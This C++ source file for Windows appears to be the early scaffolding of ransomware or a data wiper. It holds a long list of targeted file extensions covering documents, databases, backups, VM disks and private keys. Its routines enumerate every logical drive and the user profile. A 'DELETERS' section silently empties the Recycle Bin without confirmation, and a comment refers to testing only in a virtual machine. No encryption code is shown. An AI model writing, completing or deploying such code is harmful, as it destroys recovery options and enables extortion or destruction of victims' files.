#include <iostream>
#include <vector>
#include <Windows.h>
#include <limits.h>
#include <Shlobj.h>  //getUserDir()


std::vector<std::string> tiposFichero = { ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg", ".eml", ".vsd", ".vsdx", ".txt",
".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".jpeg", ".jpg", ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm",
".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp",
".602", ".sxi", ".sti", ".sldx", ".sldm", ".sldm", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz",
".gz", ".7z", ".rar", ".zip", ".backup", ".iso", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu",
".m4u", ".m3u", ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla",
".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".pl", ".vb",
".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas", ".cpp", ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm",
".odb", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop",
".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw",
".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".key", ".pfx", ".der" };

std::vector<std::string> directorioProhibido = { "node_modules","AMD"};

std::string getOsName()
{
    #ifdef _WIN64
        return "Windows 64-bit";
    #elif _WIN32
        return "Windows 32-bit";
    #elif __APPLE__ || __MACH__
        return "Mac OSX";
    #elif __linux__
        return "Linux";
    #elif __FreeBSD__
        return "FreeBSD";
    #elif __unix || __unix__
        return "Unix";
    #else
        return "Other";
    #endif
}


///////////////////////////MULTiBYTE/////////////////////////////

std::vector<std::string> getLogicalDrives()
{

    DWORD dwSize = MAX_PATH;
    char szLogicalDrives[MAX_PATH] = { 0 };
    std::vector<std::string> disks;

    DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);

    if (dwResult > 0 && dwResult <= MAX_PATH)
    {
        char* szSingleDrive = szLogicalDrives;
        while (*szSingleDrive)
        {
            disks.push_back(szSingleDrive);
            // get the next drive
            szSingleDrive += strlen(szSingleDrive) + 1;
        }
    }

    return disks;
}



std::string getUserDir()
{
    char path[MAX_PATH];
    std::string resultado = "";

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path)))
    {
        resultado = path;
    }

    return resultado;
}


////////////////DELETERS//////////////////////////////////
void delBin()
{
    SHEmptyRecycleBin(NULL, NULL, 7);
}

void delTemp()
{
    //checkear solo en mv
}